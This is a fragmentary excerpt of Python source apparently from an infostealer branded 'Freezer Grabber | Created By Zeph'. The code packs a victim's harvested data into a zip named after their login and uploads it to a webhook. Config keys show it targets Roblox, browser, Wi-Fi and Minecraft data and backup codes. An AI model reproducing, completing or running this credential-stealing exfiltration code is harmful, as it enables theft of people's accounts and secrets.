...
def main(webhook: str):
    ...
    _file = f'{localappdata}\\Freezer-Logged-{os.getlogin()}.zip'
    ...
    if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
        with open(_file, 'rb') as file:
            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Freezer-Logged-{os.getlogin()}.zip', file, 'application/zip')})
...
def zipup():
    _zipfile = os.path.join(localappdata, f'Freezer-Logged-{os.getlogin()}.zip')
            ...
            "embeds": [
                {
                    ...
                    "footer": {
                        "text": "Freezer Grabber | Created By Zeph"
                    },
                    "thumbnail": {
